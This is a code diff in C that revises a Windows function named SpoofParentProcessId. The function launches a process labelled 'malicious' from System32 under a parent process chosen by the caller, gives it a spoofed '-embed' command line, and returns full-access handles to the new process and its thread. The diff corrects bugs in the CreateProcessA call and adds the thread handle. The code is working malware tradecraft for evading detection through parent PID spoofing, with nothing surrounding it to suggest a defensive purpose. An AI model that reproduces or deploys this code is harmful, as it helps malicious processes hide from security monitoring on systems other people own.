@@ -740,53 +740,59 @@ BOOLEAN SpoofParentProcessId
 	IN     HANDLE  hDesiredParentProcessHandle, //a HANDLE is a datatype used by the WinAPI to handle i.e. Interact with objects (files, processes, threads, consoles, windows, etc..)
 	   OUT PDWORD  pdwMaliciousProcessPID,
 	   OUT PHANDLE phMaliciousProcessHandle,
-	   OUT PDWORD  pdwMaliciousThreadId
+	   OUT PDWORD  pdwMaliciousThreadId,
+	   OUT PHANDLE phMaliciousThreadHandle
 )
 {
-	CHAR                               lpPath[MAX_PATH * 2];
-	CHAR                               WnDr[MAX_PATH];
-	SIZE_T						sThreadAttributeListSize;
+	CHAR                        lpPath[MAX_PATH * 2];
+	CHAR						WnDr[MAX_PATH];
+	SIZE_T						sThreadAttributeListSize, sConvertedBytes = 0;
 	PPROC_THREAD_ATTRIBUTE_LIST pThreadsAttributeList_t;
 	STARTUPINFOEXA				StartupInfoEx_t	= { .StartupInfo.cb = sizeof(STARTUPINFOEXA) };
 	HANDLE						hHeap			= GetProcessHeap();
 	PROCESS_INFORMATION         ProcessInformation_t = { 0 };
-	PUCHAR SpoofedCommandLineArgumet;
+	PCHAR SpoofedCommandLineArgument;
 	
 	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttributeListSize);
 
 	if (!(pThreadsAttributeList_t = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sThreadAttributeListSize))) return FALSE;
 
-	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
-		//printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
+	if (!GetEnvironmentVariableA("WinDir", WnDr, MAX_PATH)) 
+	{
 		return FALSE;
 	}
+
 	if (sprintf_s(lpPath, MAX_PATH,"%s\\System32\\%s", WnDr, pMaliciousProcessName) == 1) return FALSE;
 
 	if (!InitializeProcThreadAttributeList(pThreadsAttributeList_t, 1, NULL, &sThreadAttributeListSize)) return FALSE;
 
 	if (!UpdateProcThreadAttribute(pThreadsAttributeList_t, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hDesiredParentProcessHandle, sizeof(HANDLE), NULL, NULL)) return FALSE;
 
-	if (!(SpoofedCommandLineArgument = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH))) return FALSE;
-
 	StartupInfoEx_t.lpAttributeList = pThreadsAttributeList_t;
+
+	if (!(SpoofedCommandLineArgument = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR)))) return FALSE;
 	
 	if (!SpoofedCommandLineArgument) return FALSE;
-	sprintf_s(SpoofedCommandLineArgument, MAX_PATH, "%s -embed", lpPath);
+	
+
+	if (!sprintf_s(SpoofedCommandLineArgument, MAX_PATH, "%s -embed", lpPath)) return FALSE;
+
 	if (!CreateProcessA(
-		NULL,
 		lpPath,
 		SpoofedCommandLineArgument,
 		NULL,
-		FALSE,
-		EXTENDED_STARTUPINFO_PRESENT | DETACHED_PROCESS,
 		NULL,
-		"C:\\System32",
+		FALSE,
+		DETACHED_PROCESS | EXTENDED_STARTUPINFO_PRESENT,
+		NULL,
+		"C:\\Windows\\System32",
 		&StartupInfoEx_t.StartupInfo,
-		&ProcessInformation_t))
-		return FALSE;
+		&ProcessInformation_t)) return FALSE;
+	
+	
 	*pdwMaliciousProcessPID   = ProcessInformation_t.dwProcessId;
 	*phMaliciousProcessHandle = ProcessInformation_t.hProcess;
 	*pdwMaliciousThreadId = ProcessInformation_t.dwThreadId;
-	 
+	*phMaliciousThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, *pdwMaliciousThreadId);
 	return TRUE;
 }
